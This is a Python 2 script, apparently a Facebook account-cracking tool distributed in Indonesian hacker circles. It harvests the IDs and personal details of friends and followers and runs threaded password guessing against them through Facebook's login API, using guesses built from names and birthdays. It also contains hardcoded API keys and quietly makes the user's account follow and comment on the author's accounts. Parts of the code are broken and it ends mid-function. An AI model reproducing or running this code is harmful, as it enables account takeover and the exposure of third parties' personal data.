#!/usr/bin/python2
# coding=utf-8
# Haiyo.... ngapsin loe
# update 19 jan 2020
# By KMB. ID [ Asim.102 ]
# copyright 2020 - 2021


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

### SETTING
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16')]



### Exit
def keluar():
	os.sys.exit()
	
### Animasi gerak
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

### LOGO HOME #####
logo = ("""\033[96m     _____________________________/\.\033[1;91mD \033[93mO \033[92mR\033[97m_\033[95mNEWS
\033[96m    / `---`___________----_______/--] \033[91m• • •\033[97m ░▒▓D
\033[96m   /_|;;;;;;;;;|_______.:/ \033[93mPrograme \033[97mPython \033[94m2
\033[96m    ), ---.( \( ) /\033[91m╔═══════════════════════════╗
\033[96m   // (..)),,----` \033[91m║  \033[93m★\033[4;45;97m Admin & Design Art \033[0m\033[93m★   \033[91m║
\033[96m  //___//          \033[91m║    \033[93m KMB•ID\033[92m【Asim•CH】    \033[91m║
\033[96m //___//           \033[91m╚═══════════════════════════╝
\033[96m ╚═════╝ \033[91m[\033[93mUPDATE\033[91m] \033[94mMulti \033[92mBruteForce \033[91mFacebook \033[97mNew""")

### LOGO Asim
logo_l4 = """\x1b[00m\x1b[96m ╔══════════════════════════════╦════════════════╗
 ║ \x1b[1;91m╦ ╦ ╦ A╔═╗ ╔═╗ ╔═╗ ╔═╗ ╔═╗  \x1b[1;96m║\x1b[41;92m    KMB • ID    \x1b[0m\x1b[1;96m║  
 ║ \x1b[1;91m║ ╚-╣ S╠╣  ║   ║   ║ ║ ║    \x1b[1;96m╠\x1b[41;96m════🛡️══════🛡️════\x1b[0m\x1b[96m╣
 ║ \x1b[1;97m╩╝  ╩ M╚═╝ ╩   ╩   ╚═╝ ╩ \x1b[93m404\x1b[1;96m║\x1b[1;47;91m© \x1b[94mcopyright \x1b[95m2020\x1b[0m\x1b[1;96m║
 ╚══════════════════════════════╩════════════════╝"""

def tik():
    animation = '|/-\\'
    for i in range(100):
        time.sleep(0.2)
        sys.stdout.write('\r\033[1;36m[!] \x1b[1;32mWaitt gan \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()

def titik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.01)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []

### Siapa Kamu ###
def siapa():
	os.system('clear')
	print logo_l4
	print ('''\x1b[00m     ▓▀██      ▒█████    ▄████  ▀▀▓ ███▄   ▀█▓
      ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █▓
      ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒
      ▒██░    ▒██   ██░░▓█  ██▓░██░▓██▒  ▐▌██▒
      ░█▄▄██▀▒░ ████▓▒░░▒▓███▀▒░██░▒██░   ▓██░
      ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒
      ░ ░\x1b[00m\033[3;93;41m C R E A T E  U S E R  L O G I N \033[00m\x1b[1;00m░ ░
        ░ ░   ░   ░    ░ ░   ░    ░   ░   ░
         ▒     ░        ░        ░       ▒''')
	nama = raw_input("\x1b[96m╔═════\033[44;1;93m Please enter your data for confirmation \x1b[0m\n\x1b[1;96m║\n\x1b[1;96m╚══▶ \x1b[1;4;97mYour Name \x1b[1;91mOR \x1b[1;97mYour Nick \033[1;91m:\x1b[0m \033[1;41;92m ")
	print "\x1b[0m"
	if nama =="":
		print "\033[1;96m[!] \033[1;91mIsi yang benar"
		time.sleep(1)
		siapa()
	else:
		os.system('clear')
		print logo_l4
		jalan("\n\x1b[00m\033[1;93m            Selamat datang \033[41;92m MR." +nama+ " \n\x1b[0m\033[1;93m⏩ Terimakasih telah menggunakan tools ini !! ⏪\n    👹👹 Enjoy in your life \033[41;92m MR." +nama+" \x1b[0m 👹👹\n        \x1b[1;97mPersonal Contact : \x1b[1;94mhttps://www.youtube.com/c/AsimPardasi\n\x1b[1;41;96m💰 NOOBY TEAM INDONESIA ,\x1b[1;47;91m KMB • ID {L4•ERROR} 💰\x1b[0m")
		jalan("\n\x1b[92m]  Gunakan dengan bijak & semoga bermanfaat\n dan Admin tidak bertanggung jawab atas resiko yang tlah anda kerjakan\n SALAM NOOBY KARATAN BILA ADA SARAN / KRITIKAN BISA melalui Instagram asimch617\n  mari bersama-sama kita belajar untuk membangun menjadi sesuatu yg lebih baik lagi...")
		time.sleep(2)
		login()

### LOGIN ###
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 48*"\x1b[1;96m═"
		print "\033[40;91m Enjoy \x1b[93min \033[92mYour \x1b[94mLife , \033[96mNever \033[95mGive \x1b[91mup \033[92m! KEEP SMILE \x1b[0m"
		print 48*"\x1b[1;96m═"
		
		
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				kmb = open("login.txt", 'w')
				kmb.write(z['access_token'])
				kmb.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=L4.ERRORS&access_token='+z['access_token'])
				requests.post('https://graph.facebook.com/raden.id.961/subscribers?access_token='+z['access_token'])
				requests.post('https://graph.facebook.com/114360143439363/comment?message=User-FBdor&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print "\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print ("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print ("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

### MENU ###
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print "\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print "\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print "\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	jalan ("\x1b[3;97mContact =>Subscribe Asim Pardasi Channel  => https://github.com/asim102 \033[0m")
	print "\033[1;96m╔"+46*"\033[1;96m═"+"╗"
	print "║\x1b[1;93m[\033[1;92m★\033[1;93m]\033[1;97m User \033[1;91m: \033[1;92m"+ nama + (35 - len(nama)) * '\x1b[1;96m ' + '║'
	print "║\x1b[1;93m[\033[1;96m※\033[1;93m]\033[1;97m Subs \033[1;91m: \033[1;92m"+ sub + (35 - len(sub)) * '\x1b[1;96m ' + '║'
	print "╠"+7*"═"+"╦"+8*"═"+"\x1b[1;91m❴\x1b[3;4;43;95m MENU TOOLS \x1b[0m\x1b[1;91m❵\x1b[1;96m"+16*"═"+"╣"
	print "║ \x1b[1;93m[ \x1b[95m1\x1b[93m ] \x1b[96m║\x1b[1;97m Info Akun FB. \x1b[1;96m"+23*" "+"║" 
	print "║ \x1b[1;93m[ \x1b[95m2\x1b[93m ] \x1b[96m║\x1b[1;97m Hack Random FB. \x1b[92m(mini) \x1b[1;96m"+14*" "+"║" 
	print "║ \x1b[1;93m[ \x1b[95m3\x1b[93m ] \x1b[96m║\x1b[1;97m Hack Target manual Wordlist. \033[1;96m"+8*" "+"║" 
	print "║ \x1b[1;93m[ \x1b[95m4\x1b[93m ] \x1b[96m║\x1b[1;97m Hack Target Auto Wordlist. \x1b[92m(mini)\x1b[1;96m"+4*" "+"║" 
	print "║ \x1b[1;93m[ \x1b[95m5\x1b[93m ] \x1b[96m║\x1b[1;97m Foto Profile Guard FB. 🛡️\033[1;96m"+13*" "+"║" 
	print "║ \x1b[1;93m[ \x1b[95m6\x1b[93m ] \x1b[96m║\x1b[1;97m Auto UnFriends ALL in FB. \033[1;96m"+11*" "+"║"
	print "║ \x1b[1;93m[ \x1b[95m7\x1b[93m ] \x1b[96m║\x1b[1;97m Check Update. \033[1;96m"+23*" "+"║" 
	print "║ \x1b[1;93m[ \x1b[91m0\x1b[93m ] \x1b[96m║\x1b[1;41;93m Logout akun or change akun \x1b[0m\x1b[1;96m"+10*" "+"║" 
	print "║ \x1b[1;93m[\x1b[91m 99\x1b[93m] \x1b[96m║\x1b[1;41;93m Exit\x1b[0m\x1b[1;96m"+33*" "+"║" 
	print "║"+7*" "+"║"+38*" "+"║"
	print "╠"+7*"═"+"╩"+7*"═"+"\033[1;91m❴\033[3;4;43;95m Input number \x1b[0m\033[1;91m❵\033[1;96m"+15*"═"+"╝"
	print "║"
	pilih()

## pilih opsi menu
def pilih():
	kmb = raw_input("\033[1;96m╚═════\033[41;93m❨ \033[3;96mAsimCH\033[1;93m ❩\033[0m\033[1;96m════════\033[1;91m▶\033[1;95m ")
	if kmb =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()
	elif kmb =="1":
		informasi()
	elif kmb =="2":
		masal()
	elif kmb =="3":
	    brute()
	elif kmb =="4":
		mini_Target()
	elif kmb =="5":
		guard()
	elif kmb =="6":
		unfriend()
	elif kmb =="7":
		jalan('Check in updating script from Admin (KMB.ID). \nPlease Wait. . . . . .!!!')
		os.system("git pull origin master")
		time.sleep(2)
		siapa()
	elif kmb =="0":
		jalan('      Deleting      Access      Login       ' )
		os.system('rm -rf login.txt')
		jalan('      Open      Access      Login      News    ' )
		time.sleep(3)
		print logo_l4
		os.system('clear')
		login()
	elif kmb =="99":
		jalan ("\n\x1b[93m             TERIMA KASIH \x1b[91m...... \x1b[95mBOSS !! \n\x1b[92m                TRY \x1b[94mAGAIN \x1b[97mLATER....😂😂😂") 
		time.sleep(3)
		os.system('clear')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih()

##### INFO #####
def informasi():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ("""\x1b[1;92m ╔═══════════════════════════════════════════════╗
\x1b[1;92m ║          \x1b[1;91m❴\x1b[46;3;4;91m1. INFORMATION ACCOUNT \x1b[0m\x1b[1;91m❵\x1b[1;92m            ║
\x1b[1;92m ╚═══════════════════════════════════════════════╝""")
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mEnter to Back \033[1;91m]")
		menu()

### MENU HACK ###
def masal():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print "\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo_l4
	print ("""\x1b[1;92m ╔═══════════════════════════════════════════════╗
\x1b[1;92m ║              \x1b[1;91m❴\x1b[46;3;4;91m 2. HACK MASSAL \x1b[0m\x1b[1;91m❵\x1b[1;92m               ║
\x1b[1;92m ╠═══════════════════════════════════════════════╝""")
	jalan("""\x1b[96m ╠▶\x1b[1;93m [ \x1b[97m01 \x1b[93m]\x1b[93m Crack from Your Friend
\x1b[96m ╠▶\x1b[1;93m [ \x1b[97m02 \x1b[93m]\x1b[93m Crack from Friend to Friends List
\x1b[96m ╠▶\x1b[1;93m [ \x1b[97m03 \x1b[93m]\x1b[93m Crack from Follower
\x1b[96m ╠▶\x1b[1;93m [ \x1b[91m00 \x1b[93m]\x1b[1;91m Kembali""")
	print "\x1b[96m ║"
	opsi_masal()

## -opsi Autombf
def opsi_masal():
	kmb = raw_input("\033[1;96m ╚═════\033[41;93m❨ \033[3;96mAsim.Ch\033[1;93m ❩\033[0m\033[1;96m════════\033[1;91m▶\033[1;95m ")
	if kmb =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		opsi_masal()
		
	elif kmb == "01" or kmb =="1":
		os.system('clear')
		print logo
		print 48*"\033[1;96m═"
		print "\033[93m[#]\x1b[97mFrom your Friend" 
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID Teman Anda\033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
			
	elif kmb == "02" or kmb =="2":
		os.system('clear')
		print logo
		print 48*"\033[1;96m═"
		print "\033[93m[#]\x1b[97mFrom Friend to list Friends" 
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID TemanMu \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print "\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print "\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			masal()
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif kmb == "03" or kmb =="3":
		os.system('clear')
		print logo
		print 48*"\033[1;96m═"
		print "\033[93m[#]\x1b[97mFrom your FOLLOWER" 
		try:
			jalan('\033[1;96m[✺] \033[1;93mMengambil ID FOLLOWER\033[1;97m...')
			ots = requests.get('https://graph.facebook.com/me/subscribers?fields=name,id&limit=999999999&access_token=' + toket)
			b = json.loads(ots.text)
			sub = str(b['summary']['total_count'])
			for fo in b['data']:
				id.append(fo['id'])
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFollower tidak ditemukan'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
			masal()
			
	elif kmb == "00" or kmb =="0":
		os. system('clear')
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		menu()

	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	titik = ['.   ',    '..    ',    '...    ']
	for o in titik:
		print ("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 48*"\033[1;96m═"

##-exskusi Autombf
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			### Auto pass1
			pass1 = (b['first_name']+'123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] \x1b[1;97m' + user+' = '+pass1+' ➡' +b['name']+'\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass1+' ➡' +b['name']
					cekpoint.append(user+pass1)
				else:
					### Auto pass2
					pass2 = (b['first_name']+'12345')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓]\x1b[1;97m'+user+' = '+pass2+' ➡' +b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass2+' ➡' +b['name']
							cekpoint.append(user+pass2)
						else:
							### Auto pass3
							pass3 = (b['last_name']+'123')
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓]\x1b[1;97m'+user+' = '+pass3+' ➡' +b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass3+' ➡' +b['name']
									cekpoint.append(user+pass3)
								else:
									### Auto pass4 ###
									pass4 = ('sayang')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓]\x1b[1;97m'+user+' = '+pass4+' ➡' +b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass4+' ➡' +b['name']
											cekpoint.append(user+pass4)
										else:
											### Auto pass5
											lahir = (b['birthday'])
											pass5 = lahir.replace('/', '')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓]\x1b[1;97m'+user+' = '+pass5+' ➡' +b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass5+' ➡' +b['name']
													cekpoint.append(user+pass5)
												else:
													### Auto pass6
													pass6 = ('Bangsat') 
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓]\x1b[1;97m'+user+' = '+pass6+' ➡' +b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass6+' ➡' +b['name']
															cekpoint.append(user+pass6)
														else:
															### Auto pass7
															pass7 = (b['last_name']+'12345') 
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓]\x1b[1;97m'+user+' = '+pass7+' ➡' +b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[✖]\x1b[1;97m'+user+' = '+pass7+' ➡' +b['name']
															        cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	masal()

#### Hack MINI Target ####
def mini_Target():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ("""\x1b[1;92m ╔═══════════════════════════════════════════════╗
\x1b[1;92m ║         \x1b[1;91m❴\x1b[46;3;4;91m4. TARGET is FRIEND (mini) \x1b[0m\x1b[1;91m❵\x1b[1;92m          ║
\x1b[1;92m ╚═══════════════════════════════════════════════╝""")
	print "\033[1;93m[\033[1;91mINFO\033[1;93m] \033[1;97mThe target account must be friends\n       with your account first!"
	print 48*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
		time.sleep(2)
		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
		time.sleep(2)
		print 48*"\033[1;97m═"
		### Mini pz1
		pz1 = (a['first_name']+'123')
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
				menu()
			else:
				### Asim CH
				pz2 = (a['first_name']+'12345')
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
					menu()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
						menu()
					else:
						### Asim CH
						pz3 = (a['last_name']+'123')
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
							menu()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
								menu()
							else:
								### Asim CH
								pz4 = (a["last_name"]+"12345")
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
									menu()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
